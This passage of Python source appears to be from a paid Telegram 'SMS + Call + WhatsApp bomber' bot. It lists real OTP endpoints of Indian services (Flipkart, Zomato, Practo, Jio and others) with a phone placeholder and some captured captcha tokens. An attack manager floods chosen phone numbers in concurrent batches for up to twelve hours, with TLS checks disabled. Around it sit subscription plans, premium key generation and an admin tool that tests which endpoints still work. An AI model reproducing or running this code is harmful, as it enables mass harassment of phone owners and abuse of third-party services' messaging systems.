    # 96. Flipkart Voice
    apis.append({
        "name": "Flipkart_Voice",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile": "{no}"}
    })
    
    # 97. Zomato Voice
    apis.append({
        "name": "Zomato_Voice",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": "phone={no}&type=voice"
    })
    
    # 98. MakeMyTrip Voice
    apis.append({
        "name": "MakeMyTrip_Voice",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phone": "{no}"}
    })
    
    # 99. Practo SMS
    apis.append({
        "name": "Practo_SMS",
        "url": "https://accounts.practo.com/phone_number_resend_otp",
        "method": "POST",
        "headers": {
            "X-NewRelic-ID": "UAcFWVRADQsIXFNU",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": "mobile=%2B91{no}&g-recaptcha-response=0cAFcWeA4LKhUNc1gFczOyhgZzq9mCm7tT7I-FQllZbY_jv2epFHGRn5t_Z1rBhKQRZq5SDZvI5gxLruglRfjZTIlvT0HeaQ-Yg7Mw2Gy3w6QdAOlKH-AGGSTDMMSadAHftEg1K868hurF8Eqm71JVDaAH3XgpNeRRAMdpQrQvXS9dWyoQhfXu1Hr7iHUNnc7aPS4rZS6UMx24YaxhiFEQA7OId4nmpc08mq7zGhFRkFxYrE4mhHwBRLLdb49nu5pwEUBhRlgD_TljqOWoDUsZqcr4kPPppV_9CbmN6ntLt-jh11PTK1UcF1vPE2kyIp6H9VBQu3rhG9gqMiuc8TjAwntB1iHxOP01Rv1GkxncolCpgpreGlti__DT-rjKhgWvn6l5lMSU-a2n79V1wxY1_AdRWZ6HDK9oFWhLkRX7YzQB5dI0NJKLGF8tZDDTUQY2q9d840wph-1BRQoL3sv_o2f7wur1gmNQkPhuQlw2aJPX-hTPAS2sq5JyYKe4nTPYxwupnHxCfhw8OqFtriazRHut_9bKUEW5vu7SZgybmQE1Olfq9AL_OJb61kHW73pR5bkdJc61y2MNWcNdj8bcejzv_H_YizRDM6IKpYaWu4iHZOWiG6ePVQdjSJ6TScW3C1OS2dTllVWTx4nG4MAxxM31-1fsIqkgBM1y-LnttHVDxEWOFGgfrDlghyUa_VfC7hNDlk1LTOw1YEamQZ-c1gNIoMs-POo0Dmc853CZ_CsVcOd3klBksWJD8hc8JdaljbJbQUwHFYyGS2xkn66trJaSyWqdf8FytpePaG-J9Y0GsX09UXKK8M3FVAOp4EDpkYQbYArgAXgbZCJBem2Gfq3oSmkbwyH4yPUbK300Efozof6AzzvztS80kwlN-FaxLA5H3yxsYAhOiAit-HKInj_TIxKyGGC8eM8MY75roZ7CKtSm37ohvdz6GsGQrsZUHxVlmVmDx6jcKdDaap8Xn7LkUj2ZbYFkIZzCv4qoNzPelhSwqBFcwATI0x_RiKDxzz1PozfvKW77eBUYZs8QpZNEneBA9pg-jQtWR4lNoghy49nRiq_npCKuGxRkdt7gCQZj0Nr2mfjjimfYZdDOFQ-CAb56WiOOFFefmYdZML53Zak59pZLZxAcR2GSbPRUsTCUdFSRf9bNgyRUwGgj2yt3yposwawV3xmQaqPhQYJ0Lan83roYDr4YmucZlKriyljsv-xjR4bJFgOjO9Jx1Q8fzd4tyfcgFq7JUQ8fXZFMqCvMBEOqsfE"}
    })
    
    # 100. Practo Voice
    apis.append({
        "name": "Practo_Voice",
        "url": "https://accounts.practo.com/send_voice_otp",
        "method": "POST",
        "headers": {
            "X-NewRelic-ID": "UAcFWVRADQsIXFNU",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": "mobile=%2B91{no}&g-recaptcha-response=0cAFcWeA4UvhfXOC4zOYWpUqagDOdtUGvLowCjT3xxZsRHnLIyMQ_VFu27OKB_3tQXfarDvDWhGYtcwLll2sQ1gDxOiHtosPK8DxrG8Ik1XmjsM-CUz-q5DoH8SGbVsYK2tlmJuOSC3k2J_ftOHxsYqTSm75opTJbAVuueFRolX10ux9nyn3QETF8Sy2czMK-pyhwDSEWJuH1woL-onjPtE3OM-mS99RDkxYthJZUQ_ZNClfX0QH88RSSgA_x49CqQLA3S47HZMHq-DRvuvC81KIixxfsoDNTzCtbFQHjT4KWgKAQuyXjIB6QJeWoLmYlpvjRpJ3JzafZjhPRXlnmjOpjVbHkKXf9nQ-RyWepZMBroDNv84IFdk9djy_lAPDT1uVP95ObGUcyjMz60nipeO8X0kKAPT5uCPt4getcKulOdh1a8YAzF-vYfjdBG_K1PQ6r060J_aZHXU8_nS9PVpDnfanxtBbi60tk1gv_y52ED4Mj3ZB7Eum9gDXZYAT97xwTp9UR1Vy5dsFCclsqTsINQBH_y5yZJ3xqhOn0asokTmfuzLGxBRFVWC0gGpgXPiLp5LI7oF5GgK1B1zYv0LJR0S2EQAd7HcNPEp5WegheWmIYRrLQTRVxi52HjhOut7uBseq_lCOY_ObU2k-DcK6khpmBItyD3a5oc-nao-sHrE-SABRSrWPzDwbuU3oEwwXziebATwIP951QbUaoMEJv-j6MM7cVEasQQowdnLVF_g6v3Gc4pP6rtmXCW2XMgTF8D01iKOc2uU_t8f7P1Ws5az2P3o6LpZKHRwMEzsMWB-_b5q5KMs61xEcjMhMmURJ2Ba_4oTkPrWU5DVUaFbWdEatf_cVbhG_1pPpcnZtsVJNHrSdSQCgcX8MFcIoVbU5S7qDZbgTc86bjHnFCmnHnYeViWaIvuut3ugu3BN8lVHZco92i6wzMfSIlsYSGf9e9j_2jBbuSsx4KK-FeTwR06i1W0MH5mW9lsZqnxhEDwW1UflUt-tVLAmTXItEpN4nZOJDShMwIfQhDWBL4IQ9ADfPQywpVdXreT7iS80kVm8QO0asWUIrUNg0EkzAbE-aIft878ogK6BbPmYpFWjROBv1CMLAdXigefvq-1t-vGE0jx6KooyGdOeIBiHMx8Ex9RGTkkTe99Oz38b9Wh3lQaOOaAosDsuSHyUKMSFOffc9axpI04SQb1oKSNj7sUw4KQoToWAWtUj4JHJPbl3bZ_HMoe6juZCzKHK1BcUVxCpxNbS3bFEhk"}
    })
    
    # 101. MyAstro
    apis.append({
        "name": "MyAstro",
        "url": "https://myastro.org.in/sendOtpPinnacle",
        "method": "GET",
        "params": {"phone": "{no}"},
        "headers": {
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {}
    })
    
    # 102. Holidayify
    apis.append({
        "name": "Holidify",
        "url": "https://www.holidify.com/rest/package/submitCallme.hdfy",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": "name=Adesh+Dubey&emailId=&contact={no}&country=88&internalPlaceCode=SINGAPORE&leadData=Destination.Packages_callMe_Packages_callMe_timeout_null&destCountryCode=SINGAPORE&countryPhoneCode=%2B91&platform=Linux+armv81&pageUrl=https%3A%2F%2Fwww.holidify.com%2Fplaces%2Fsingapore%2Fpackages.html%3Futm_source%3Dgoogle%26utm_medium%3Dpmax%26utm_campaign%3Dsingapore_pmax%26gad_source%3D1%26gad_campaignid%3D22725252908%26gbraid%3D0AAAAADLSud5aKXKVA0SLBfyeMwzh-26x4%26gclid%3DCjwKCAjwhNbTBhB4EiwAsFSg-ujhXN2fE1UAkJu948NZbf1V-KUlrFaPr828QQdKS4xxMk_MMZqB1RoCCEAQAvD_BwE&placeName=Singapore&referrer=https%3A%2F%2Fwww.google.com%2F&utmSource=google&utmMedium=pmax&utmCampaign=singapore_pmax&tourPackageIds=&quoteId=0&agentId=0&otpRequired=1&activeTourPackage=0"}
    })
    
    # 103. Jio
    apis.append({
        "name": "Jio",
        "url": "https://www.jio.com/api/jio-login-service/login/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobileNumber": "{no}", "loginFlowType": "MOBILE", "alternateNumber": ""}
    })
    
    # 104. KPN WhatsApp
    apis.append({
        "name": "KPN_WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST",
        "params": {"channel": "AND", "version": "3.2.6"},
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{no}"}}
    })
    
    # 105. Wakefit SMS
    apis.append({
        "name": "Wakefit_SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile": "{no}"}
    })
    
    # 106. Byjus SMS
    apis.append({
        "name": "Byjus_SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phone": "{no}"}
    })
    
    # 107. Hungama OTP
    apis.append({
        "name": "Hungama_OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobileNo": "{no}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}
    })
    
    # 108. Meru Cab
    apis.append({
        "name": "MeruCab",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": "mobile_number={no}"
    })
    
    # 109. ShipRocket
    apis.append({
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobileNumber": "{no}"}
    })
    
    # 110. GoKwik V3
    apis.append({
        "name": "GoKwik_V3",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phone": "{no}", "country": "in"}
    })
    
    # Remove duplicates based on URL and method
    seen = set()
    unique_apis = []
    for api in apis:
        key = f"{api['url']}_{api['method']}"
        if key not in seen:
            seen.add(key)
            unique_apis.append(api)
    
    return unique_apis

APIS = build_api_list()

# ========== DATABASE WRAPPER ==========
class DatabaseWrapper:
    def __init__(self):
        self.db = db
    
    def __getattr__(self, name):
        return getattr(self.db, name)

database = DatabaseWrapper()

# ========== ATTACK MANAGER ==========
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.db = database
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
            "okhttp/3.9.1",
            "okhttp/5.0.0-alpha.2",
        ]
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        self._session = None
        self._connector = None
    
    async def _get_session(self):
        if self._session is None or self._session.closed:
            self._connector = aiohttp.TCPConnector(
                ssl=self.ssl_context,
                limit=30,
                limit_per_host=10,
                ttl_dns_cache=300,
                enable_cleanup_closed=True,
                force_close=False
            )
            timeout = aiohttp.ClientTimeout(total=15, connect=5, sock_read=10)
            self._session = aiohttp.ClientSession(
                connector=self._connector,
                timeout=timeout
            )
        return self._session
    
    async def _close_session(self):
        if self._session and not self._session.closed:
            await self._session.close()
        if self._connector and not self._connector.closed:
            await self._connector.close()
        self._session = None
        self._connector = None

    async def _make_request(self, api, phone):
        try:
            session = await self._get_session()
            url = api['url']
            
            params = api.get('params', {}).copy() if api.get('params') else {}
            if params:
                for k, v in params.items():
                    if isinstance(v, str):
                        params[k] = v.replace('{no}', phone)
            
            headers = api.get('headers', {}).copy()
            if 'User-Agent' not in headers:
                headers['User-Agent'] = random.choice(self.user_agents)
            
            def replace_body(body):
                if isinstance(body, dict):
                    return {k: replace_body(v) if isinstance(v, (dict, list)) else 
                           (v.replace('{no}', phone).replace('{phone}', phone) if isinstance(v, str) else v) 
                           for k, v in body.items()}
                elif isinstance(body, list):
                    return [replace_body(item) if isinstance(item, (dict, list)) else 
                           (item.replace('{no}', phone).replace('{phone}', phone) if isinstance(item, str) else item) 
                           for item in body]
                elif isinstance(body, str):
                    return body.replace('{no}', phone).replace('{phone}', phone)
                return body
            
            body = replace_body(api.get('body', {}))
            
            method = api['method'].upper()
            if method == 'GET':
                async with session.get(url, headers=headers, params=params) as resp:
                    await resp.text()
            elif method == 'PUT':
                async with session.put(url, headers=headers, json=body) as resp:
                    await resp.text()
            else:
                if isinstance(body, dict):
                    async with session.post(url, headers=headers, json=body, params=params) as resp:
                        await resp.text()
                else:
                    async with session.post(url, headers=headers, data=body, params=params) as resp:
                        await resp.text()
            return True
        except Exception:
            return False

    async def _worker_task(self, user_id, phone, api_list, end_time):
        while time.time() < end_time:
            if user_id not in self.active_attacks:
                break
            if not self.active_attacks[user_id].get("running", False):
                break
            if phone not in self.active_attacks[user_id].get("targets", []):
                break
            
            batch_size = min(15, len(api_list))
            batch = random.sample(api_list, batch_size) if len(api_list) > batch_size else api_list
            
            tasks = [self._make_request(api, phone) for api in batch]
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            await asyncio.sleep(0.15)

    async def start_attack(self, user_id, targets, duration_minutes):
        if user_id in self.active_attacks:
            return False, "Attack already running"
        
        if not await self.db.is_premium(user_id):
            return False, "Premium required"
        
        max_dur = await self.db.get_max_duration(user_id)
        if duration_minutes > max_dur:
            return False, f"Max duration is {max_dur} minutes for your plan"
        
        concurrency = await self.db.get_concurrent_limit(user_id)
        if concurrency == 0:
            return False, "Premium required"
        
        if len(targets) > concurrency:
            return False, f"Your plan allows max {concurrency} concurrent targets"
        
        for target in targets:
            if await self.db.is_protected(target):
                return False, f"Number {target} is protected!"
        
        end_time = time.time() + (duration_minutes * 60)
        max_workers = min(concurrency, 3)
        
        self.active_attacks[user_id] = {
            "targets": targets,
            "end_time": end_time,
            "running": True,
            "workers": {}
        }
        
        chunk_size = max(1, len(APIS) // max_workers)
        api_chunks = []
        for i in range(max_workers):
            start = i * chunk_size
            end = start + chunk_size if i < max_workers - 1 else len(APIS)
            api_chunks.append(APIS[start:end])
        
        for target in targets:
            self.active_attacks[user_id]["workers"][target] = []
            for i in range(max_workers):
                task = asyncio.create_task(
                    self._worker_task(user_id, target, api_chunks[i], end_time)
                )
                self.active_attacks[user_id]["workers"][target].append(task)
        
        return True, f"Started attack on {len(targets)} target(s)"

    async def stop_attack(self, user_id):
        if user_id in self.active_attacks:
            self.active_attacks[user_id]["running"] = False
            
            for target_workers in self.active_attacks[user_id].get("workers", {}).values():
                for task in target_workers:
                    if not task.done():
                        task.cancel()
            
            await asyncio.sleep(0.5)
            del self.active_attacks[user_id]
            await self._close_session()
            return True
        return False
    
    def get_active_targets(self, user_id):
        if user_id in self.active_attacks:
            return self.active_attacks[user_id]["targets"]
        return []

    # ========== NEW: CHECK WORKING APIS ==========
    async def check_working_apis(self, phone="9999999999"):
        """Check which APIs are working (return 200 OK). Admin only feature."""
        working_apis = []
        failed_apis = []
        
        # Create a fresh session for testing
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=20, limit_per_host=5)
        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            total = len(APIS)
            tested = 0
            
            for api in APIS:
                tested += 1
                try:
                    url = api['url']
                    headers = api.get('headers', {}).copy()
                    if 'User-Agent' not in headers:
                        headers['User-Agent'] = random.choice(self.user_agents)
                    
                    def replace_body(body):
                        if isinstance(body, dict):
                            return {k: replace_body(v) if isinstance(v, (dict, list)) else 
                                   (v.replace('{no}', phone).replace('{phone}', phone) if isinstance(v, str) else v) 
                                   for k, v in body.items()}
                        elif isinstance(body, list):
                            return [replace_body(item) if isinstance(item, (dict, list)) else 
                                   (item.replace('{no}', phone).replace('{phone}', phone) if isinstance(item, str) else item) 
                                   for item in body]
                        elif isinstance(body, str):
                            return body.replace('{no}', phone).replace('{phone}', phone)
                        return body
                    
                    body = replace_body(api.get('body', {}))
                    params = api.get('params', {}).copy() if api.get('params') else {}
                    if params:
                        for k, v in params.items():
                            if isinstance(v, str):
                                params[k] = v.replace('{no}', phone)
                    
                    method = api['method'].upper()
                    
                    if method == 'GET':
                        async with session.get(url, headers=headers, params=params) as resp:
                            if resp.status == 200:
                                working_apis.append(api['name'])
                            else:
                                failed_apis.append(api['name'])
                    elif method == 'PUT':
                        async with session.put(url, headers=headers, json=body) as resp:
                            if resp.status == 200:
                                working_apis.append(api['name'])
                            else:
                                failed_apis.append(api['name'])
                    else:
                        if isinstance(body, dict):
                            async with session.post(url, headers=headers, json=body, params=params) as resp:
                                if resp.status == 200:
                                    working_apis.append(api['name'])
                                else:
                                    failed_apis.append(api['name'])
                        else:
                            async with session.post(url, headers=headers, data=body, params=params) as resp:
                                if resp.status == 200:
                                    working_apis.append(api['name'])
                                else:
                                    failed_apis.append(api['name'])
                except Exception:
                    failed_apis.append(api['name'])
                
                # Small delay to avoid rate limiting
                if tested % 10 == 0:
                    await asyncio.sleep(0.5)
        
        return working_apis, failed_apis

manager = AttackManager()

# ========== FORCE CHANNEL JOIN SYSTEM ==========
async def check_channel_join(update, context):
    uid = update.effective_user.id
    if uid == OWNER_ID:
        return True
    channel = await manager.db.get_channel()
    if not channel:
        return True

    channel_clean = channel.strip()
    if channel_clean.startswith("https://"):
        channel_clean = channel_clean.replace("https://", "", 1)
    if channel_clean.startswith("http://"):
        channel_clean = channel_clean.replace("http://", "", 1)
    if channel_clean.startswith("t.me/"):
        channel_clean = channel_clean.replace("t.me/", "", 1)
    channel_clean = channel_clean.lstrip("@").split("?")[0].split("/")[0].strip()
    if not channel_clean:
        return True

    try:
        member = await context.bot.get_chat_member(channel_clean, uid)
        if member.status in ("member", "administrator", "creator"):
            return True
    except Exception:
        pass

    kb = InlineKeyboardMarkup([[InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{channel_clean}")]])
    msg = (f"⛔ ACCESS DENIED!\n\n"
           f"❌ Aapko hamara channel join karna hoga bot use karne ke liye:\n\n"
           f"👉 t.me/{channel_clean}\n\n"
           f"✅ Channel join karne ke baad /start dobara dabayein.")
    try:
        if update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.reply_text(msg, reply_markup=kb)
        else:
            await update.message.reply_text(msg, reply_markup=kb)
    except Exception:
        pass
    return False

async def web_server():
    from aiohttp import web
    async def handle(request):
        return web.Response(text="Bot is Alive!")
    app = web.Application()
    app.router.add_get('/', handle)
    app.router.add_get('/health', lambda r: web.Response(text="OK"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"🌐 Web Server running on port {PORT}")

def main_kb(user_id):
    kb = [
        [KeyboardButton("🚀 /mix"), KeyboardButton("📊 /status")],
        [KeyboardButton("👤 /account"), KeyboardButton("💳 /plan")],
        [KeyboardButton("🛡 /protect"), KeyboardButton("🔓 /unprotect")],
        [KeyboardButton("🔑 /redeem"), KeyboardButton("❓ /help")]
    ]
    if user_id == OWNER_ID:
        kb.append([KeyboardButton("👑 Admin")])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

async def multi_target_kb(user_id):
    max_targets = await manager.db.get_concurrent_limit(user_id)
    buttons = []
    for i in range(1, min(max_targets, 10) + 1):
        buttons.append([InlineKeyboardButton(f"🎯 {i} Target(s)", callback_data=f"targets_{i}")])
    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(buttons)

async def duration_kb(user_id):
    max_dur = await manager.db.get_max_duration(user_id)
    con = await manager.db.get_concurrent_limit(user_id)
    buttons = []
    row = []
    durations = [1, 5, 15, 30, 60, 120, 180, 240, 300, 360, 480, 600, 720]
    for minutes in durations:
        if minutes <= max_dur:
            if minutes < 60:
                label = f"{minutes}min"
            elif minutes == 60:
                label = "1h"
            else:
                label = f"{minutes//60}h"
            row.append(InlineKeyboardButton(label, callback_data=f"dur_{minutes}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
    if row:
        buttons.append(row)
    buttons.append([InlineKeyboardButton(f"⚡ {con}x Concurrent per target", callback_data="info")])
    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(buttons)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    await manager.db.add_user(uid)
    await update.message.reply_photo(WELCOME_IMAGE, caption=f"🔥 Welcome to Premium Multi-Target Bomber!\n\n📡 Total APIs: {len(APIS)}\n🎯 SMS + Call + WhatsApp\n\nUse /help for commands.", reply_markup=main_kb(uid))

async def mix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    if not await manager.db.is_premium(uid):
        await update.message.reply_text("⛔ Premium Required!\nUse /plan to buy or /redeem to activate.")
        return
    if uid in manager.active_attacks:
        await update.message.reply_text("⚠️ You already have an active attack!\nUse /status to check.")
        return
    
    max_targets = await manager.db.get_concurrent_limit(uid)
    await update.message.reply_text(f"📞 Select number of targets to attack (Max: {max_targets}):", reply_markup=await multi_target_kb(uid))
    context.user_data['waiting_for_target_count'] = True

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    if uid in manager.active_attacks:
        info = manager.active_attacks[uid]
        left = int((info['end_time'] - time.time()) / 60)
        targets = ", ".join(info['targets'])
        await update.message.reply_text(f"🔥 MULTI-TARGET ATTACK RUNNING\n🎯 Targets: {targets}\n📊 Count: {len(info['targets'])}\n⏳ Left: {left} min", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP ALL", callback_data="stop")]]))
    else:
        await update.message.reply_text("💤 No active attacks.")

async def account_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    plan = await manager.db.get_plan_name(uid)
    expiry = await manager.db.get_expiry(uid)
    con = await manager.db.get_concurrent_limit(uid)
    max_dur = await manager.db.get_max_duration(uid)
    await update.message.reply_text(f"👤 ACCOUNT\n🆔 {uid}\n📋 Plan: {plan}\n📅 Expiry: {expiry}\n⚡ Concurrent Targets: {con}\n⏰ Max Duration: {max_dur}min")

async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_join(update, context):
        return
    msg = "💳 AVAILABLE SUBSCRIPTION PLANS\n\n"
    for key, p in PLANS.items():
        msg += f"🔹 {p['name']} Plan (₹{p['price']})\n"
        msg += f"   - Duration: {p['days']} Days\n"
        msg += f"   - Concurrent Targets: {p['concurrent']}\n"
        msg += f"   - Max Task Duration: {p['max_duration']} minutes\n\n"
    msg += "💡 Use /redeem if you have a code.\n💬 Contact @RolexBot00 for purchase."
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("👤 Contact Admin", url=f"tg://user?id={OWNER_ID}")]])
    await update.message.reply_text(msg, reply_markup=kb)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_join(update, context):
        return
    await update.message.reply_text("🔑 Send your premium code:\nFormat: PREMIUM-XXXXXXXX")
    context.user_data['waiting_for_redeem'] = True

async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    if not await manager.db.is_premium(uid):
        await update.message.reply_text("⛔ Premium required!")
        return
    await update.message.reply_text("🛡 Send 10-digit number to protect:")
    context.user_data['waiting_for_protect'] = True

async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    await manager.db.unprotect(uid)
    await update.message.reply_text("🔓 Number unprotected.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_join(update, context):
        return
    msg = f"""ℹ️ USER HELP & INSTRUCTIONS

🚀 CORE COMMANDS
• /start: Main menu with quick-access buttons
• /mix: Start multi-target attack on numbers
• /status: See live progress of your attacks

👤 ACCOUNT & SUBSCRIPTION
• /account: Shows your current plan and time left
• /plan: Displays all available subscription plans
• /redeem: Activate your subscription with a code

🛡️ NUMBER PROTECTION
• /protect & /unprotect: Manage number protection

💡 FEATURES:
• SMS + Call + WhatsApp Bombing
• Standard: 2 targets/300min
• Premium: 5 targets/720min  
• Ultimate: 10 targets/720min
• Total APIs Loaded: {len(APIS)}

💡 Tip: Use the buttons below for quick access!"""
    await update.message.reply_text(msg, reply_markup=main_kb(update.effective_user.id))

# ========== ADMIN PANEL ==========
async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Generate Standard Key (30 days)", callback_data="adm_gen_standard")],
        [InlineKeyboardButton("⭐ Generate Premium Key (30 days)", callback_data="adm_gen_premium")],
        [InlineKeyboardButton("👑 Generate Ultimate Key (30 days)", callback_data="adm_gen_ultimate")],
        [InlineKeyboardButton("🔧 Custom Key (Days & Plan)", callback_data="adm_custom_key")],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data="adm_broadcast")],
        [InlineKeyboardButton("📊 View Statistics", callback_data="adm_stats")],
        [InlineKeyboardButton("📣 Set Channel (Force Join)", callback_data="adm_set_channel")],
        [InlineKeyboardButton("🗑 Remove Channel", callback_data="adm_remove_channel")],
        [InlineKeyboardButton("🔍 Check Working APIs", callback_data="adm_check_apis")]
    ])
    await update.message.reply_text("👑 Admin Control Panel:\nSelect an option:", reply_markup=kb)

async def generate_key_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    context.user_data['waiting_for_genkey'] = False
    try:
        parts = text.split()
        days = int(parts[0])
        plan = parts[1].lower() if len(parts) > 1 else "standard"
        if plan not in PLANS:
            plan = "standard"
        code = await manager.db.generate_code(days, plan)
        await update.message.reply_text(f"✅ KEY GENERATED SUCCESSFULLY!\n\n🔑 Code: `{code}`\n📅 Days: {days}\n📋 Plan: {plan.upper()}\n\nSend this code to user for premium activation.", parse_mode="Markdown")
    except:
        await update.message.reply_text("❌ Invalid format!\nUse: `days plan_type`\nExample: `30 premium`\n\nAvailable plans: standard, premium, ultimate", parse_mode="Markdown")

async def broadcast_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    context.user_data['waiting_for_broadcast'] = False
    users = await manager.db.get_all_users()
    success, failed = 0, 0
    msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
    for uid_user in users:
        try:
            await context.bot.send_message(uid_user, f"📢 ANNOUNCEMENT\n\n{text}")
            success += 1
        except Exception:
            failed += 1
            await asyncio.sleep(0.1)
    await msg.edit_text(
        f"✅ BROADCAST COMPLETED\n✅ Success: {success}\n❌ Failed: {failed}"
    )

async def process_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    uid = update.effective_user.id
    numbers = [num.strip() for num in text.replace(',', ' ').split() if num.strip().isdigit() and len(num.strip()) == 10]
    target_count = context.user_data.get('expected_targets', 0)
    
    if len(numbers) != target_count:
        await update.message.reply_text(f"❌ Please send exactly {target_count} phone numbers.\nExample: {' '.join(['9876543210'] * target_count)}")
        return
    
    context.user_data['waiting_for_numbers'] = False
    context.user_data['target_numbers'] = numbers
    manager.db.set_attack_data(uid, numbers)
    max_dur = await manager.db.get_max_duration(uid)
    await update.message.reply_text(f"📞 Targets: {', '.join(numbers)}\n⏰ Select duration (Max: {max_dur}min):", reply_markup=await duration_kb(uid))

async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
